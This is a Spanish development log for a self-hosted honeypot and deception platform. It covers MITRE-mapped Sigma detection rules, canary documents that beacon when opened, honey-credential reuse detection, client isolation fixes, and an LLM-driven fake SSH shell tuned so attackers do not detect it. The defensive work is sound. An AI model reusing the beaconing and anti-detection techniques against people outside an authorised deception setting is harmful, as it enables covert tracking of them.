  - **Pendiente T1-6..T1-16:** re-auditar con la misma lente honeypot-vs-forense antes de escribir. Probable que YA tengan regla `command`-based (p.ej. `defense_evasion/T1070_*`, `execution/`, `exfiltration/`). Huecos honeypot candidatos confirmados por grep: T1-9 (T1571 non-std port, no existe), T1-13 (shell-profile `.bashrc` Linux, no existe), T1-14 (deserialización rO0AB/pickle; el A08 actual es "unsigned code", no deser.). T1-8 bloqueado por HASSH (T3-1).
  - **Deuda técnica detectada (no en el roadmap original):** duplicación de reglas — mismo T-code en `persistence/` y `mitre/`, pares casi idénticos (`T1136_001_local_account_created` vs `_creation`), sufijos `_v2`. Candidato a un pase de dedup/consolidación que reduciría el ruido del ruleset.
  - **TIER 1 COMPLETO (T1-6..T1-16):** workflow `tartarus-tier1-audit-gapfill` (20 agentes) confirmó por ground-truth que las 10 técnicas restantes eran GAP honeypot (todas las reglas MITRE existentes eran forenses `product:windows` que no disparan). Escritas 10 reglas honeypot nuevas en `tartarus/`, verificadas con `tests/test_tier1_gapfill_rules.py` (30 tests) + FP check contra corpus benigno (0 FP). Motor: 394→404 reglas. **Estado Tier 1: 15/16 HECHO, T1-8 BLOQUEADO (HASSH/T3-1).** Cobertura honeypot dedicada de MITRE ATT&CK subió sustancialmente (antes la matriz estaba inflada por reglas forenses inertes).
  - **BLOQUE "sin hardware" (Fable 5, 2 workflows de scout+build):** construidos y verificados:
    - **rule-dedup List A:** borrados 10 duplicados EXACTOS (dirs planos legacy vs canónicos mitre/owasp-sub). Motor 404→394. **List B DESCARTADO:** análisis determinista (comparación de líneas por grupo) mostró que los 23 grupos "near-dup" del scout son en realidad COMPLEMENTARIOS (solapamiento 24–61%, 0 subconjuntos/idénticos) — reglas forenses distintas de la misma técnica. Borrarlas perdería cobertura. NO se tocaron. El único dedup real era List A. 
    - **T3-5 STIX/TAXII, T3-6 GeoIP backend, T6-3 Lote A tokens, T6-6 alert UX backend** — ver filas en la tabla. **95 tests verdes** en total (66 sigma + 6 stix + 5 canary + 16 alert-ux + 2 geoip). main.py 297 líneas (C2 OK), sin pandas (C1 OK), imports limpios, STIX 2.1 validado con datos reales.
    - **T3-1 HASSH: BLOQUEADO por fuente de datos** (Beelzebub no emite KEXINIT) → T1-8 sigue bloqueado. No es tema de hardware.
    - **UI cableada y verificada E2E** (stack Docker arriba): STIX download, tokens, panel alert-UX en popover de IP, GeoIP map. Playwright headless: 0 errores. Commit 89afb4f.
  - **rule-dedup List B DESCARTADO**: análisis determinista mostró 0 duplicados reales (23 grupos son complementarios, overlap 24-61%). Borrarlos perdería cobertura.
- 2026-07-09 (cont., interés explícito del usuario tras releer el mapeo Thinkst — ver memoria [[thinkst-mapeo]]):
  - **T6-9 Attack Map / Graphview 3 columnas** — HECHO y verificado (screenshot). Es la "interfaz de ramificaciones" que el usuario quería. Commit 6a8d5ae.
  - **Document Canarytokens fire-on-open** (parte de T6-3): `engine/canary_docgen.py` (make_docx/pdf/xlsx, solo stdlib) + `GET /canary/t/{token}` (web-bug público, registra open como evento CANARY + pixel) + `POST /canary-tokens/document` (genera+descarga) + botón UI "⬇ Doc Token". Verificado E2E: docx válido con callback `TargetMode="External"`, GET al web-bug registra evento en BD + triggered_count++. Commit 610bdb7. Nota prod: fijar `TARTARUS_CANARY_BASE_URL`.
  - Pendiente Thinkst sin hardware (buildable): resto de tokens (Lotes B/C/D: web-bug URL, QR, cloned site/CSS, redirects, Google Doc/Sheet), Graphview vistas Compact/Compressed, breadcrumbs (T6-2 parcial), personalities catálogo YAML (T6-4 sin el IP-stack fingerprint).
- 2026-07-09 (rework crítico de viz + 3 features Mahoraga/Thinkst — commit 6f584b7):
  - **Consolidación de vistas** (decisión del usuario "Attack Map manda"): RETIRADO el Attack Graph force-directed (graph.js dead-code); Attack Map 3-col es la vista de flujo canónica. Infra Map REESCRITO a topología+salud de sensores (tarjetas active/degraded/offline, proto:puerto, hits, Sensor Health, Hits by Port) — ya no duplica al Attack Map. GeoIP estado honesto "Sin atacantes externos (LAN)".
  - **Fix consistencia 3-vs-2 atacantes**: era ventana de tiempo distinta por vista. Helper `time_filter`/`count_attackers` (session_correlator.py) + `?hours` (default 24) en /events/stats, /graph/attack-map, /events/geo; todas las vistas pasan hours=24 → conteo idéntico. Consolidados los 2 `/sessions` duplicados.
  - **T6-5 tokens por perfil** (ver fila) — la feature estrella Thinkst que el usuario pidió.
  - **Decoy-reuse detection** (idea Mahoraga): al plantar honey-cred se auto-genera regla Sigma que dispara cuando el secreto se REUTILIZA (no solo al acceder). `decoy_usage.py` + hook honey_creds_router. Reglas generadas GITIGNORED (llevan el secreto) — patrón `engine/rules/sigma/tartarus/decoy_reuse_*.yml`.
  - **Score Redis con decaimiento** (idea Mahoraga): `session_scorer.py` + hook consumer.py, fingerprint IP:UA, TTL decay, umbral → notifier.
  - Descartado de Mahoraga: auto-parcheo LLM, dual prod/shadow, dashboard React (Tartarus es Canvas puro C3). Pendiente Mahoraga: lista IOCs/SSRF.
  - Sobre canarytokens.org: decisión = SELF-HOSTED (no enlazar a Thinkst; cadena de custodia + OPSEC + VRA propios).
- 2026-08-07 (fin de sesión larga — **Tier 0 completo + Tier E arrancado, en PR #12**):
  Rama `feature/tier0-deployment-readiness` pusheada, **PR #12 → main** (11 commits, suite 882 verde).
  **HECHO y verificado E2E:**
  - **Tier 0** (`487ea22`): gate 11/11 (`scripts/audit_gate.sh`), #10 ingesta ciega (`ingestion_health.py`
    + frescura en `/health` + reconexión AMQP), telemetría de campo (`POST /ingest/sensor` HMAC),
    test de integración de aislamiento de flocks, `/detections/rules` aplicables vs cargadas,
    `scripts/reset_clean.sh`.
  - **TE-A** enrolamiento (`fcea76c`): `POST /flocks/{id}/enroll` + `POST /sensors/enroll` (auto-bind) +
    re-home de sensores al borrar flock + `scripts/sensor-enroll.sh`.
  - **TE-B OT** (`95d7d1d`,`7461491`): honeypot **Modbus/TCP** (`sensors/modbus_canary/`, scoring ICS
    T0846/T0836, write=crítico) + **portscan detection first-class** (`portscan_detector.py`, Host Port
    Scan/T1046, en consumer + ingest).
  - **TE-C.1-3 cebos** (`083a4aa`): planter doc/pdf que **beaconan** (reusa `canary_docgen`), creds
    únicas + `register_decoy`, breadcrumbs FTP/RDP/SMB reconciliados con OpenCanary.
  - **TE-D1 API SOC** (`c06f63b`): tokens de menor privilegio (`soc_auth.py`, hasheados, read-only,
    flock-scoped) + `/api/v1/soc/{incidents,devices,detections}` (`soc_router.py`, rate-limited) +
    engine internal-only (bind 127.0.0.1). Runbook TLS en wiki.
  - **E-E notificaciones** (`ae28dd7`): persistencia (`notify_config`) + UI de credenciales + Ignorar-IP real.
  - **E-F/F2/F2.5 dashboard** (`446ed87`,`378a07c`,`7511b41`): navegación por vistas (Principal/Análisis/
    Gestión), threat-intel honesto internal/external, Infra Map eliminado, Audit Trail legible,
    `graph.js` borrado. ADR-0011 (wiki).
  - OPSEC: `190ff39` neutralizó el nombre del SIEM en 2 archivos; 2 mensajes de commit lo conservan
    (aceptado — el cliente ya estaba público en el repo). filter-branch bloqueado en el entorno.
  **PENDIENTE (para la próxima):**
  - **TE-C.4** file-share cebo por SMB (OpenCanary) con árbol tokenizado (doble capa) — follow-up mayor.
  - **TE-D2** feed real al SIEM externo: decidir **pull** (SIEM hace poll a `/api/v1/soc/*`) vs **push**
    (canal syslog/CEF/webhook en `notifier.py`, reusar patrón del canal Slack).
  - **TE-B3/B4**: LDAP/VNC + OpenCanary en stack raíz; realismo (IP-stack fingerprint, +personalities, AD-DC).
  - **TE-G**: modos VM/OVA + Tailscale (nube al final).
  - Merge del PR #12; loaaan aún sin aceptar invitación (su deploy RPi depende del fix de transporte).

---

## 27-ago-2026 — Separación entre flocks: lo que se cerró y lo que queda

### Cerrado

- **`honeypot_id` era inatribuible.** `consumer.py` leía `raw.get("HandlerName")`, campo que
  Beelzebub **no emite** (0 de 1473 eventos). `Handler`, el que sí existe, trae `not_found` /
  `configured_regex` (rutas de matching HTTP), no el honeypot. Ahora se deriva de `dest_port` vía
  `sensor_registry` (cacheado en `_SENSORES_POR_PUERTO`, refrescado con las asignaciones).
- **Atribución por sensor.** Cadena: regla del operador → sensor que escucha el puerto → flock por
  defecto. Un cliente = su sensor en su puerto. Verificado con ataque SSH real.
- **BUG: detecciones con `flock_id` NULL.** El COALESCE al Default vivía solo en el SQL del INSERT,
  así que el **diccionario** seguía en None y las detecciones lo heredaban. Una detección NULL no
  aparece en NINGÚN flock (el Default también filtra por su UUID). El backfill del arranque las
  reparaba, así que el fallo **duraba solo el uptime del proceso** y no dejaba rastro. Resuelto en
  Python (`_DEFAULT_FLOCK_ID`).
- **Backfill histórico:** 1420 eventos rellenados desde `dest_port`. Respaldo previo en el
  scratchpad. Quedan 22 sin sensor (Prometheus 2113 y Modbus 502, no registrados).
- **`loaded_rules` global en respuesta por flock** (`detection_router.py`): las 87 reglas del motor
  se pintaban como detecciones del cliente y encendían el panel como «Activo» con 0 componentes.
  Añadido `reglas_del_motor_global`; la UI ya no las usa para el banner ni para la casilla.
- **Ruido de `hosts`:** 254 de 259 filas eran un barrido /24 con `state_reason='reset'`, sin puertos,
  sin MAC y sin hostname. `ORDER BY last_seen DESC LIMIT 50` las ponía primero. Ahora se ocultan por
  defecto (`?incluir_sin_senal=true` para verlas), se ordena por señal, y se devuelve
  `sin_senal_ocultos` para no truncar en silencio.
- **UI:** honeypots etiquetados «compartidos»; el detalle del evento dice qué sensor lo capturó y de
  qué cliente es.

### Anotado — NO viable por configuración

- **Clave de host de Beelzebub no persiste** (P2). Se regenera en cada reinicio → salta
  `REMOTE HOST IDENTIFICATION HAS CHANGED`. Desbloqueo: `ssh-keygen -R "[localhost]:2222"`. No hay
  opción de configuración en v3.9.0. **Delata el honeypot**: quien vuelva tras un reinicio sabe que
  la máquina es efímera. Salidas posibles: volumen para las claves si una versión futura lo soporta,
  o fork.
- **Beelzebub sin estado de sesión** (`cd` no funciona). Ya documentado el 26-ago.

### Pendiente

- **62 de 91 endpoints GET no aceptan `flock_id`** (informe del 27-ago). Varias secciones que solo se
  ven DENTRO de un flock se alimentan de ellos. Inventario en el informe; falta decidir cuáles deben
  acotarse y cuáles son legítimamente globales (y por tanto deben rotularse como tal).
- ✅ ~~**Prometheus (2113) y Modbus (502) sin entrada en `sensor_registry`** → 22 eventos sin sensor.~~ **HECHO (28-ago).** Registrados: `beelzebub-prometheus` (2113→Default) y `modbus-canary-01` (502→**Pruebita**). Los eventos futuros ya cruzan con sensor.
- Traducir los 1424 eventos históricos; gráfica de electrocardiograma; error de flock duplicado.
- LLM del engine sin clave (`provider: template` en silencio) hasta que se cargue en *AI Settings*.

### Nota de método

Las pruebas de mutación hechas restaurando ficheros con `cp` quedaron **contaminadas por bytecode en
caché**: el `.pyc` de la versión mutada sobrevivía a la restauración. Se repitieron todas limpiando
`__pycache__`. Si se vuelve a mutar código para validar tests, limpiar el caché entre iteraciones.

---

## 27-ago-2026 (2ª tanda) — Regresión de CSS propia y duplicación entre pestañas

### Regresión introducida por mí, y reparada

El commit `6f7c394` (retirar la barra lateral) quitó **124 líneas y añadió 16**; solo ~40 eran de
`.side-nav`. Con ellas se fueron reglas sin relación, y cada una rompió algo visible:

| Borrada | Efecto |
|---|---|
| `.central-kpis`, `.ck-*` | KPIs del panel central como texto plano vertical («3Flocks», «5/6Sensores activos») |
| `.flock-spark` | Sin altura fija, la gráfica de 24 h de cada cliente ocupaba media pantalla |
| `.admin-section { display:none }`, `.as-modal`, `.admin-backdrop` | Auditoría, notificaciones y usuarios visibles en las 4 pestañas y dentro de todos los flocks → se leía como filtración entre clientes |
| `.gear-menu`, `.gear-item` | El menú ⚙ que las abre como overlay |
| `.flock-tag` | Etiqueta de cliente en el feed global |

**Comprobación que lo impide repetirse** (`test_ui_navegacion.py`): recorre las clases que `main.js`
manipula vía `classList.add/toggle/remove` y `querySelectorAll('.x')` y exige que existan en el CSS.
Habría atrapado también el bug `.view-tabs` / `.view-nav`. Un segundo test obliga a podar la lista de
excepciones si alguien les da estilo.

**Pendiente heredado**: `.canary-field` y `.canary-report-save` no existen en el CSS **desde antes de
esta tanda** (verificado en `6f7c394~1`). Están en la lista de excepciones conocidas. P3.

### Una sola entrada por cosa (27 → 25 secciones)

- **`sensorSection` retirada**: repetía la familia 📡 del hub de Despliegue, en la misma pestaña. Lo
  único que tenía y el hub no —desglose activos/degradados/offline— se llevó al hub
  (`_pintarContadorSensores`) junto con el subtítulo de umbrales de latido.
- **Cebos y honey-creds movidos junto al hub**: se desplegaban desde Infraestructura y se
  administraban en Trampas. Trampas queda con análisis y disfraz.
- **`geoSection` absorbida** en `attackMapSection` como segundo modo. Salía siempre vacía (0 IPs
  públicas) y parecía rota; ahora explica por qué no hay nada que situar, consultando
  `/api/events/geo`, el mismo endpoint que ya usa `geomap.js`.

### Discovered Hosts: lo propio, aparte

`motivo_infraestructura_propia()` en `infra_filter.py`, **aparte de `is_infra_source()` y no en su
lugar**: en la ingesta el gateway Docker no se ignora a propósito (un ataque NATeado llega con esa
IP), pero la tabla `hosts` la llena el escáner y ahí el gateway es nuestro. Devuelve el motivo, no un
booleano, para que la consola diga por qué agrupa. En vivo: 3 hallados, 2 propios, 254 sin señal.

### Nota de método — dos falsos positivos propios

1. **Bytecode en caché** (ya anotado en la tanda anterior): sigue vigente, limpiar `__pycache__` al
   mutar código para validar tests.
2. **La consulta de vigilancia del invariante usaba `f->>'weight'`; el campo es `points`.** Sumaba
   cero y marcaba **1485 de 1485 eventos como descuadrados**. Con el nombre correcto: **0**. Antes de
   dar por roto un invariante, comprobar el nombre del campo contra `jsonb_pretty(risk_factors)`.

---

## 28-ago-2026 — AI Settings: la clave se guarda donde nadie la lee (P1)

**Síntoma**: metes la clave de OpenAI en *AI Settings*, pulsas **Test** y responde
`{"status":"error","message":"No AI provider configured"}`.

**Causa, en tres capas** (`engine/engine/settings_router.py`):

1. `ENV_FILE = Path(__file__).parent.parent.parent / ".env"`. Dentro del contenedor el módulo vive en
   `/app/engine/settings_router.py`, así que tres `.parent` dan `/` → **escribe en `/.env`, la raíz
   del contenedor**.
2. **El `.env` del proyecto no está montado** en el engine. Los únicos montajes son
   `./engine → /app` y `./beelzebub/configurations → /app/bee-config`.
3. **Nadie lee `/.env`**: `docker compose` lee el `.env` del *host*. Comprobado en vivo — `/.env`
   dentro del contenedor tiene `OPENAI_API_KEY` de 164 caracteres, y
   `printenv OPENAI_API_KEY` en ese mismo contenedor devuelve **vacío**.

**Por eso el fallo es intermitente y confunde**: al guardar, `llm.configure()` sí configura el
cliente **en memoria**, así que funciona hasta el siguiente reinicio del engine. Como hoy se reinició
varias veces por los cambios, la clave se perdió y quedó `provider: template` en silencio.

**Arreglo propuesto**: montar el `.env` del host en el contenedor (o apuntar `ENV_FILE` a una ruta
montada y persistente) y, o bien releer el fichero al arrancar, o exponer en la consola que la clave
solo vive en memoria hasta el siguiente reinicio. Un test debe fijar que `ENV_FILE` cae dentro de una
ruta montada, no en `/`.

**No confundir los dos LLM** (ver también la memoria `tartarus-llm-honeypot`):

| | Dónde vive la clave | Estado 28-ago |
|---|---|---|
| **Honeypot (Beelzebub)** | `beelzebub/configurations/services/*.yaml`, campo `openAISecretKey` | **Funciona.** Verificado: SSH a `:2222` responde como `prod-web-01` |
| **Engine (AI Settings)** | Debería ser `.env` → hoy `/.env` del contenedor | **Roto**, por lo de arriba |

El botón **Test** de *AI Settings* prueba el LLM **del engine**, no el del honeypot. Que el honeypot
funcione y el botón falle es coherente, pero la consola no lo explica.

### Bug adyacente: la casilla «Beelzebub sync» no hace nada (P2)

`main.js` llama a `POST /api/settings/beelzebub/ai` cuando se marca. Ese endpoint está **marcado como
DEPRECADO en su propio docstring**: escribe en `.env`, y Beelzebub lee la clave **del YAML**, no del
entorno. Debe llamar a `POST /services/{file}/llm`, que sí escribe en el YAML.

## ✅ HECHO (28-ago) — Puesta a cero para llevar control

Ejecutado. Entregables:

- **`scripts/puesta_a_cero.sh`**: reproducible (respaldo pg_dump verificado → TRUNCATE de 12 tablas de
  datos → limpieza de Redis por patrón → reinicio del engine → verificación a 0). Conserva flocks,
  usuarios, `flock_assignments`, `notify_config` y **`sensor_registry` intacto**. Se ejecuta con
  `--yes` o pide confirmación en la fase de borrado.
- **Vaciado también `console_audit`** (623 filas) por decisión de Iván; eliminados 2 `remote_sensors`
  zombis (smoke-test del 15-jun).
- **Cliente de prueba Pruebita** con sensor Modbus (:502) en `sensor_registry` + regla
  `honeypot_id=modbus-canary-01 → Pruebita`. Prometheus (2113) registrado al Default.
- **Prueba de humo de aislamiento** (en `wiki/registro-pruebas.md`): Modbus→502 = 10 eventos SOLO en
  Pruebita; HTTP→80 = 5 SOLO en Default; IR e Iván a 0. Aislamiento correcto.
- Respaldos: `backups/db/tartarus_pre_reset_20260828_1509.sql.gz` y `_1516.sql.gz`.
- Método: contar por flock con subconsultas correlacionadas, no con `LEFT JOIN` encadenados
  (producto cartesiano da conteos inflados).

**Sigue pendiente (objetivo real):** la verificación de aislamiento a fondo — atacar cada sensor y
comprobar que no asoma nada en los demás flocks, incluidos los 62/91 endpoints GET sin `flock_id`.

---

## 28-ago-2026 (2ª tanda) — Radar de UX y reinicio de fábrica

### Cerrado hoy
- **Reinicio de fábrica** (`scripts/reinicio_de_fabrica.sh`): deja la plataforma como instalación
  nueva (solo Default + flota base de 6 sensores, 0 datos, 0 reglas). Hermano de `puesta_a_cero.sh`
  (que conserva inventario). Respaldo verificado + verificación de estado.
- **Onboarding de un cliente por el flujo real**: `POST /flocks` → `POST /flocks/{id}/assignments`
  (Modbus :502) → `POST /deploy/execute` (cebo) → `POST /flocks/{id}/tokens/{id}`. Verificado el
  aislamiento en vivo (registro en `wiki/registro-pruebas.md`): el cliente recibió solo sus 10
  eventos Modbus, 0 fugas; el resto de protocolos cayó en Default.

### Radar de UX — pendiente (feedback de Iván, 28-ago)

- **[P1] Timeline: color por severidad/riesgo por defecto.** Hoy manda el color por protocolo
  (`PROTO_COLORS`, `ui/src/js/timeline.js:15`), lo que engaña: SSH pintado de rojo parece crítico y
  una alerta real en verde/azul se ignora. El modo por severidad **ya existe** pero está tras un
  botón (`SEV_COLORS` + `_sevStack`, `timeline.js:31-42`). Trabajo: invertir el defecto para que el
  color exprese severidad/riesgo (lo crítico resalta sea cual sea el protocolo); el protocolo pasa a
  codificación secundaria/toggle. Esfuerzo S/M.
- **[P1] Timeline: interactividad de drill-down.** El tooltip actual es agregado por bucket
  (`timeline.js:196-262`). Al señalar/clicar la barra de un protocolo, desglosar **esa interacción
  concreta** (evento(s), IP de origen, comando, detección asociada), no solo el resumen del
  intervalo. Esfuerzo M.
- **[P1/P2] Estética de la consola.** Feedback externo: se ve arcaica / diseño demasiado estándar.
  Rediseño del sistema visual (tipografía, escala de espaciado, paleta, componentes, densidad).
  Esfuerzo L/XL — planear en su propia tanda; no tocar `_masterPoll()` ni romper el bind mount.

### Observación pendiente
- **Telnet (:23) devolvió `TIMEOUT_CONNECT`** en la pasada de hoy: no aterrizó ningún evento. Sumar
  al frente de fiabilidad de Beelzebub (junto al canal AMQP colgado y la clave de host no persistida).

---

## 28-ago-2026 (3ª tanda) — Cero real de Beelzebub + botón de borrar flock

### Cerrado
- **Bug: `flock_assignments` huérfanas al borrar un flock.** `delete_flock` re-hospedaba el
  inventario al Default pero dejaba las reglas apuntando a un flock inexistente (no hay FK). Ahora
  el endpoint las BORRA en la misma transacción y recarga el caché del consumer
  ([flocks_router.py:226](engine/engine/flocks_router.py#L226)). Test nuevo en `test_flocks.py`.
  Verificado en vivo: creado un flock con regla → borrado por el endpoint → 0 huérfanas.
  Limpiada además la huérfana que había dejado el borrado viejo de «Cliente Demo 01».
- **Botón «🗑 Eliminar flock» en el banner del flock** ([main.js:1191](ui/src/js/main.js#L1191)):
  borrado fácil desde dentro de cualquier pestaña, reusando `deleteFlock()`. Antes solo existía en
  la tarjeta del panel central. `.btn-danger` añadido al CSS.
- **Cero real del panel de Salud de honeypots**: el «322» era el contador Prometheus interno de
  Beelzebub (desde su arranque). Reiniciado el contenedor → Fuente 0 / Persistido 0. Estado final:
  1 flock (Default), 0 reglas, 0 datos, 7 sensores base.

### Aclaración registrada (no es bug)
- Los honeypots de Beelzebub se ven en la vista de cualquier flock porque son **infraestructura
  COMPARTIDA** (rótulo ya presente: «LABORATORIO COMPARTIDO»). El único despliegue por-cliente es su
  sensor asignado. La verdad para investigación es la BD (Persistido), no el contador de Beelzebub.

---

## 28-ago-2026 (4ª tanda) — AI Settings: la clave del engine ya persiste

### Cerrado (punto 1 del roadmap)
- **Bug de la ruta:** `ENV_FILE` caía en `/.env` (raíz del contenedor, no montada, que nadie lee).
  Ahora `AI_ENV_FILE = /app/.ai_runtime.env` (= host `engine/.ai_runtime.env`, **gitignoreado**), en
  ruta montada RW ([settings_router.py](engine/engine/settings_router.py)).
- **Persistencia real:** nuevo `load_ai_env()` que el engine llama al arrancar
  ([main.py:104](engine/main.py#L104)) — vuelca las claves de IA del fichero a `os.environ` ANTES de
  construir el `LLMClient`. Docker no relee el `.env` en un `restart`; con esto la clave sobrevive.
  **Verificado en vivo:** configurada la clave → `docker restart tartarus-engine` → sigue
  `available:true, persisted:true`. Antes volvía a `template`.
- **La consola no miente:** `GET /settings/ai` expone `persisted`; el modal avisa "solo en memoria" si
  la clave activa no está en fichero.
- **Beelzebub sync arreglado:** el front ya no llama al endpoint deprecado `/settings/beelzebub/ai`
  (escribía `.env`, no-op); ahora empuja la key al YAML de cada honeypot con LLM vía
  `/services/{file}/llm` y avisa del reinicio de Beelzebub ([main.js](ui/src/js/main.js)).
- Test nuevo `engine/tests/test_settings_ai.py` (5 casos): fija que `AI_ENV_FILE` no cae en `/`, que
  el cargador inyecta claves, y que `persisted` se reporta bien. Suite: 1393 verdes.

### Hallazgo que queda del lado de Iván (no es código)
- **Las DOS claves de OpenAI del repo dan `401 Unauthorized`**: la de `Entrada/GPT.rtf` (164 car.) y la
  de los YAML del honeypot (156 car., son **distintas**). OpenAI las rechaza (expiradas/revocadas/
  facturación). El fix del engine es correcto y hace la llamada real (el 401 lo demuestra), pero para
  ver el Test en verde hace falta **una clave válida nueva**. Esto también afecta al LLM del honeypot:
  con esa key en 401, sus respuestas LLM tampoco saldrían (revisar en la tanda de Beelzebub).

---

## 28-ago-2026 (5ª tanda) — AI Settings: «Test» guarda primero y el error no miente

### Cerrado
- **UX: «Test Connection» no guardaba la clave.** Test probaba solo el proveedor ya guardado, así que
  «pego la clave → Test» daba `No AI provider configured` (medido: 3 POST /settings/ai/test y 0
  POST /settings/ai). Ahora el front extrae `persistKeys()` (compartida) y **Test la llama antes de
  probar** ([main.js](ui/src/js/main.js)). Save igual, con su sync de Beelzebub aparte.
- **Honestidad del Test.** `analyze()` se traga los fallos (401, red) y cae a `template`; el endpoint
  devolvía un `warning` vago. Ahora, si hay proveedor configurado pero la respuesta vino de template,
  devuelve `error` claro: «El proveedor X está configurado pero la llamada falló (clave inválida, sin
  saldo o sin acceso al modelo)» ([settings_router.py](engine/engine/settings_router.py)). El front lo
  muestra tal cual, y distingue «Pega una API key primero» (sin clave) del 401.
- Tests nuevos en `test_settings_ai.py` (proveedor-configurado-pero-falla → error; ok cuando responde).
  Suite: 1395 verdes.

### Recordatorio (del lado de Iván)
- Sigue en pie que **las dos claves de OpenAI del repo dan 401**. Con este arreglo el Test ya lo dice
  claro en vez de despistar. Para verlo en verde: una **API key válida de platform.openai.com**.

---

## 28-ago-2026 (6ª tanda) — Honeypot SSH: estado de sesión SÍ funciona (se creía imposible)

### Hallazgo que corrige el roadmap
- **«Beelzebub v3.9.0 no mantiene estado de sesión (cd no funciona)» era FALSO.** El problema no era
  el motor: eran los **handlers estáticos** del YAML (`^cd → ''`, `^pwd$ → /home/admin`) que
  interceptaban antes del LLM. Beelzebub v3.9.0 **sí pasa el historial de la sesión al LLM**.
  Verificado en vivo: enrutando `cd` y `pwd` al LLM, tras `cd projects` el `pwd` da
  `/home/admin/projects`, y `cd ..` vuelve — **el directorio persiste entre comandos**.

### Cerrado
- **Clave válida sincronizada al honeypot** (SSH y Telnet) desde el engine, vía `/services/{file}/llm`.
  `GET /services` → `backed:true`. El catch-all LLM ya responde de verdad (antes daba 401).
- **`cd` ya no delata el honeypot**: quitado el `^cd → ''` estático → `cd` cae al LLM. `cd projects` →
  silencio; `cd carpeta_inexistente` → `bash: cd: …: No such file or directory`. Antes se tragaba todo.
- **`pwd` al LLM** (estado) + **prompt mejorado** con la lista de directorios que existen y la
  instrucción de mantener el directorio actual. `ls` se deja ESTÁTICO (el LLM lo maneja mal:
  respondía «ls: No such file or directory»).
- Cambios en `services/ssh-22.yaml` (gitignoreado por la clave). El **prompt mejorado** se versionó en
  `services.example/ssh-22.yaml` (sin clave). Telnet ya era pura-LLM: con la clave válida, su estado
  también funciona.

### Límites honestos que quedan
- El LLM es **~90% consistente**, no 100%: alguna vez erra un `cd` a un dir real (p.ej. `/var/log`) o
  mete un espacio de más. Es la naturaleza del modelo, no configurable a 100%.
- **`ls` no refleja el directorio actual** (es estático): tras `cd projects`, `ls` sigue mostrando el
  home. Aceptado como compromiso (el LLM hacía `ls` peor).
- **Clave de host SSH** sigue sin persistir (Iván lo aplazó): al reiniciar Beelzebub, el próximo login
  pide aceptar huella.
- **Deuda de versionado (preexistente):** la config rica del SSH (comandos estáticos) vive solo en el
  `services/` local gitignoreado, no en el repo. Pendiente: versionar una plantilla keyless completa.

---

## 28-ago-2026 (7ª tanda) — Cimientos del despliegue: honeypot que funciona + opt-in + diseño

### Cerrado
- **Honeypot SSH robusto**: `ls -las`/`ls -ltr`/`ls -ls`/`ls -lh` ya no dan «command not found».
  Añadidos dos handlers deterministas en `services/ssh-22.yaml`: `^ls\s+-\S*l\S*$` → listado largo,
  `^ls\s+-\S+$` → nombres. Verificado por SSH (batería completa) + estado de sesión con `cd`/`pwd`.
- **Flock opt-in (primer paso)**: en el hub de Despliegue, los honeypots de Beelzebub se rotulan como
  **«Laboratorio compartido» (plataforma, no del cliente)** y los remotos como **«Sensores de este
  cliente»**; el badge de cabecera dice **«Opt-in · nada por defecto»**. Un flock nuevo deja de
  parecer que despliega Beelzebub por defecto. (`ui/src/index.html`, `main.js` `_updateDeployFlockName`.)
- **Documento de diseño** `wiki/diseno-despliegue.md`: modelo (lab compartido + asignación + canary/
  hardware por-flock, por C4), **manual vs recomendado** (botón Desplegar), **spec del flujo «+
  Añadir» tipo Thinkst**, elección de personalidad, y **recortes de ruido de las 4 pestañas**.

### Diferido (especificado en el diseño)
- Construir la UI del flujo «+ Añadir» guiado y la **activación opt-in de protocolos** de Beelzebub.
- Aplicar los recortes de ruido de las pestañas (§6 del diseño).
- Persistir la clave de host SSH (aplazado).
- **Deuda de versionado (preexistente):** la config rica de `services/ssh-22.yaml` (incluidos los
  handlers de `ls`) vive solo local (gitignoreada por la clave). Falta versionar una plantilla keyless
  completa; hoy solo el prompt está en `services.example`.

---

## 28-ago-2026 (8ª tanda) — Shell SSH con ESTADO real (cd/ls/pwd coherentes)

### Cerrado
- **`ls` ahora refleja el directorio actual.** Antes `ls` era estático (siempre el home) mientras
  `cd`/`pwd` sí tenían estado → inconsistencia que rompía la credibilidad. Ahora `cd`/`pwd`/`ls` van
  al LLM y son coherentes: `cd projects` → `ls` = contenido de projects; `cd /var/log` → sus logs;
  `cd proyects` → error. Verificado en varias sesiones frescas.
- **Cómo:** prompt con **árbol de ficheros explícito** + regla de `cd` **permisiva desacoplada** +
  regla de **arranque en /home/admin** + modelo **gpt-4o** (gpt-4o-mini NO era capaz). El prompt vive
  en `personalities/ubuntu-server.yml` (versionado); `apply` conserva modelo/clave
  ([personality_engine.py:52](engine/engine/personality_engine.py#L52)).
- **Causa del "se revirtió" anterior:** al «Aplicar a este servicio» se copia el prompt de la persona;
  como la persona tenía el prompt viejo, machacaba mis ediciones del YAML. Solucionado poniendo el
  prompt bueno en la persona.
- **Modal de config más limpio:** Host/endpoint + API key por-honeypot ahora bajo un toggle
  **«Avanzado»** (ocultos por defecto), con explicación de cuándo usarlos.
- Test `test_ui_navegacion` actualizado al rótulo opt-in nuevo. Suite 1395 verde.

### Límites honestos / agendado
- El shell LLM es **~95%**, no 100%: glitch puntual posible (sobre todo el 1er comando).
- **Estado se arrastra entre reconexiones de la misma IP** (Beelzebub guarda historial por IP);
  reinicio de Beelzebub lo resetea; IPs distintas aisladas.
- **gpt-4o cuesta ~15× más** que mini por llamada (asumible en honeypot; decisión consciente).
- **Cowrie / motor determinista**: agendado si se necesita 100% de fidelidad.

---

## 28-ago-2026 (9ª tanda) — Entornos de deception generados por IA (a medida del cliente)

### Cerrado
- **Generador de entornos por IA**: `POST /personalities/generate-scenario` — el operador describe al
  cliente (industria, datos) y el LLM (**gpt-4o**) genera un prompt de shell SSH a medida (hostname,
  árbol de ficheros propio del negocio, contenidos, reglas con estado + anti-detección). No aplica
  nada: se prueba (`probe`), se ajusta y se guarda como persona. UI: botón **«✨ Generar entorno con
  IA»** en el editor de personas. Verificado en vivo (caso electrónica → `sensor_firmware/`,
  `plc_configs/`, `scada_dashboards/`, `bom_october.pdf`, `supplier_contracts/`).
- **Override de modelo en `llm_client.analyze(..., model=)`** (el generador usa gpt-4o aunque el global
  sea gpt-4o-mini); corregido de paso el reporte del modelo realmente usado.
- **Entorno base enriquecido**: `cat` de config/logs/código genera contenido creíble y consistente por
  sesión (verificado: `cat backup.sh` → script realista; `cat auth.log` → entradas con timestamp).
- Test nuevo `test_generate_scenario.py` (5 casos). Suite 1400 verde.

### Agendado
- **Despliegue per-cliente**: SSH por-flock en su puerto (rango 2222-2231 en compose + flujo «+
